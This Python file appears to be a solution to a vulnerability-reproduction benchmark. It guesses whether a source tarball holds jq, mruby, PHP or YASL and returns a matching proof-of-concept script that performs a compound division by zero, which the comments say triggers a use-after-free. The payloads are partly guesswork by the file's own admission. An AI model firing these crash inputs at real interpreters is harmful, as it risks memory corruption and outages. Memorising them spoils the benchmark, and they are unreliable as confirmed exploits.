import os
import tarfile
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            names = self._list_tar_names(src_path)
        except Exception:
            # Fallback PoC
            return self._fallback_poc()

        lname_set = {n.lower() for n in names}

        if self._is_jq(lname_set):
            # jq filter: cause division by zero inside try/catch to ensure fixed version exits cleanly.
            # Triggers UAF in vulnerable compound division assignment.
            return b"1|try (./=0) catch ."

        if self._is_mruby(lname_set):
            # mruby script: divide by zero via compound assignment; rescue ensures non-crash on fixed version.
            return b"begin;a=1;a/=0;rescue;end"

        if self._is_php(lname_set):
            # PHP script: compound division by zero guarded by try/catch to avoid crash in fixed version.
            return b"<?php try{$a=1;$a/=0;}catch(Throwable $e){}"

        if self._is_yasl(lname_set):
            # YASL: simple script; wrap in protected call if supported by harness not known; provide basic PoC
            return b"a=1; a/=0;"

        # Fallback generic PoC (for interpreter-like targets)
        return self._fallback_poc()

    def _list_tar_names(self, src_path: str) -> List[str]:
        names = []
        if not os.path.isfile(src_path):
            return names
        with tarfile.open(src_path, mode="r:*") as tf:
            for m in tf.getmembers():
                # skip directories
                if m.isfile() or m.isdir() or m.islnk() or m.issym():
                    names.append(m.name)
        return names

    def _is_jq(self, lname_set: set) -> bool:
        indicators = [
            "jq.c",
            "src/jq.c",
            "src/execute.c",
            "src/parser.y",
            "src/lexer.l",
            "jq.1",
            "jq.1.prebuilt",
            "src/builtin.c",
            "oniguruma.h",  # often bundled with jq
        ]
        return any(any(name.endswith(ind) for name in lname_set) for ind in indicators) or \
               any("jq/" in name and name.endswith(".c") for name in lname_set)

    def _is_mruby(self, lname_set: set) -> bool:
        indicators = [
            "include/mruby.h",
            "mruby.h",
            "mruby.conf",
            "mrbgems/mruby-",
            "src/vm.c",
            "src/array.c",
            "lib/mruby/",
            "bin/mruby",
        ]
        return any(ind in name for name in lname_set for ind in indicators)

    def _is_php(self, lname_set: set) -> bool:
        indicators = [
            "zend/zend_vm_execute.h",
            "zend/zend_execute.c",
            "main/php.h",
            "sapi/cli/php_cli.c",
            "buildconf",
            "ext/standard/basic_functions.c",
        ]
        return any(any(name.endswith(ind) for name in lname_set) for ind in indicators) or \
               any(name.startswith("zend/") for name in lname_set)

    def _is_yasl(self, lname_set: set) -> bool:
        indicators = [
            "yasl.h",
            "src/yasl.c",
            "src/ast/ast.c",
            "include/yasl/yasl.h",
            "interpreter/yasl_",
            "vm/yvm.c",
        ]
        return any(any(name.endswith(ind) for name in lname_set) for ind in indicators) or \
               any("yasl" in name for name in lname_set)

    def _fallback_poc(self) -> bytes:
        # Generic fallback: attempt a compound division by zero in a generic C-like DSL.
        # This may not work for all, but in many toy interpreters it could trigger the bug.
        return b"a=1; a/=0;"